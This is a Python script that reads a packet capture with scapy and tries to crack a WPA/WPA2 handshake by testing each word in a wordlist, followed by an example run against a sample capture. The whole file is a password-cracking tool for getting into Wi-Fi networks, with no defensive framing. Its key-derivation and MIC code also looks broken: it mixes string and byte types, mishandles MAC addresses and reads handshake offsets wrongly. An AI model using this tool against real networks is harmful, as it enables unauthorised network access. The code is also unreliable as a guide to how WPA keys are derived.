import hashlib
import hmac
from scapy.all import rdpcap, EAPOL, Dot11

def pbkdf2_sha1(passphrase, ssid, iterations=4096, dklen=32):
    """ Derive WPA Pairwise Master Key (PMK) using PBKDF2-HMAC-SHA1 """
    return hashlib.pbkdf2_hmac('sha1', passphrase.encode(), ssid.encode(), iterations, dklen)

def prf_x(key, a, b):
    """ PRF function to derive PTK (Pairwise Transient Key) """
    blen = 64
    i = 0
    r = b''
    while len(r) < blen:
        r += hmac.new(key, (a + b + bytes([i])).encode(), hashlib.sha1).digest()
        i += 1
    return r[:blen]

def get_mic(ptk, data):
    """ Compute MIC using PTK """
    return hmac.new(ptk[:16], data, hashlib.sha1).digest()[:16]

def crack_wpa_handshake(cap_file, wordlist, ssid):
    """ Crack WPA/WPA2 handshake using a wordlist """
    packets = rdpcap(cap_file)
    eapol_packets = [p for p in packets if p.haslayer(EAPOL)]
    
    if len(eapol_packets) < 2:
        print("Not enough EAPOL packets found.")
        return

    ap_mac = eapol_packets[0][Dot11].addr2.replace(':', '').lower()
    client_mac = eapol_packets[0][Dot11].addr1.replace(':', '').lower()
    anonce = eapol_packets[0][EAPOL].load[:32]
    snonce = eapol_packets[1][EAPOL].load[:32]
    mic = eapol_packets[1][EAPOL].load[-16:]

    with open(wordlist, "r") as f:
        for passphrase in f:
            passphrase = passphrase.strip()
            pmk = pbkdf2_sha1(passphrase, ssid)
            ptk = prf_x(pmk, "Pairwise key expansion", ap_mac.encode() + client_mac.encode() + anonce + snonce)
            calculated_mic = get_mic(ptk, eapol_packets[1][EAPOL].load[:-16])

            if mic == calculated_mic:
                print(f"Found! PSK: {passphrase}")
                return passphrase

    print("PSK not found in wordlist.")
    return None

# Example Usage
cap_file = "wpa.cap"
wordlist = "PWD.txt"
ssid = "test"

crack_wpa_handshake(cap_file, wordlist, ssid)
